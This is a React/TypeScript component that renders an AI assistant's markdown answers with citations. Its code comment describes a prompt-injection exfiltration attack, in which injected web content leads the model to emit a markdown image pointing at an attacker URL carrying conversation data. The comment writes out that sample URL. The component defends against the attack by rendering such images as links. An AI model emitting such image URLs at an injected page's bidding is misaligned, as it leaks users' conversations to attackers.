'use client'

import { useMemo } from 'react'

import { math } from '@streamdown/math'
import {
  defaultRehypePlugins,
  Streamdown,
  type StreamdownProps
} from 'streamdown'

import { mergeStreamdownSpecRenderer } from '@/lib/render/streamdown-spec'
import type { SearchResultItem } from '@/lib/types'
import { cn } from '@/lib/utils'
import {
  collapseCitationArtifacts,
  processCitations
} from '@/lib/utils/citation'

import { CitationProvider } from './citation-context'
import { Citing } from './custom-link'

import 'katex/dist/katex.min.css'

const rehypePlugins = Object.values(defaultRehypePlugins)

// Images inside the model's ANSWER markdown are a prompt-injection
// exfiltration channel: injected web content can make the model emit
// `![](https://attacker/pixel?d=<conversation data>)`, which the browser
// auto-loads with ZERO clicks, leaking to the attacker. Every legitimate image
// (the generate-image tool, search results, the news widget) renders through
// its own component, never through this markdown path — so nothing real is lost
// by not auto-loading here.
//
// Rendered as a click-through link instead of an <img>. That drops it to the
// same one-click, visible risk as an ordinary markdown link `[text](url)`,
// which the answer already renders and which is the accepted baseline; the
// zero-click auto-load is the only thing removed. noreferrer keeps the click
// from leaking the page URL.
export function AnswerImage({ src, alt }: { src?: unknown; alt?: unknown }) {
  const href = typeof src === 'string' ? src : ''
  const label = typeof alt === 'string' && alt ? alt : href || 'image'
  if (!href) return <>{label}</>
  return (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow">
      {label}
    </a>
  )
}

const customComponents = {
  a: Citing,
  img: AnswerImage
}

export function MarkdownMessage({
  message,
  className,
  citationMaps
}: {
  message: string
  className?: string
  citationMaps?: Record<string, Record<number, SearchResultItem>>
}) {
  // Process citations to replace [number](#toolCallId) with [number](actual-url)
  // then collapse any whitespace/punctuation artifacts left by stripped
  // fabricated anchors (e.g. "[1](#fetch_prevention)" → "" leaves "text .")
  const processedMessage = collapseCitationArtifacts(
    processCitations(message || '', citationMaps || {})
  )

  const streamdownProps = useMemo<Partial<StreamdownProps>>(
    () => ({
      mode: 'streaming' as const,
      plugins: mergeStreamdownSpecRenderer({ math })
    }),
    []
  )

  return (
    <CitationProvider citationMaps={citationMaps}>
      <div
        className={cn(
          'prose-sm prose-neutral prose-a:text-accent-foreground/50',
          className
        )}
      >
        <Streamdown
          {...streamdownProps}
          rehypePlugins={rehypePlugins}
          components={customComponents}
        >
          {processedMessage}
        </Streamdown>
      </div>
    </CitationProvider>
  )
}
